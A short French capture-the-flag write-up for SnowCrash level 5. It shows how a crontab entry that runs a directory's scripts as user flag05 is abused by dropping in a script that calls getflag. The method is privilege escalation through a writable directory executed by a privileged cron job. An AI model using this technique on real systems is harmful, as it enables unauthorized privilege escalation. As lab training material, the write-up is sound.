# Level05

Un mail suspicieux dans notre boite aux lettres
à /var/mail, il contient une entrée de crontab,
comme pour nous indiquer la direction à prendre.

```bash
level05@SnowCrash:/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le script /usr/sbin/openarenaserver potentiellement éxécuté toutes les 2 mins fait en sorte d'éxécuter le contenu du dossier /opt/openareaserver 

Nous créons un fichier script dans ce dossier
contenant la commande getflag

```bash
level05@SnowCrash:/var/mail$ vi /opt/openarenaserver/myscript.sh
```

Contenu du script:
```bash
getflag > /tmp/myflag
```

Puis nous attendons patiemment l'heure du verdict,
Et nous effectuons cela:

```bash
level05@SnowCrash:/var/mail$ cat /tmp/myflag
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```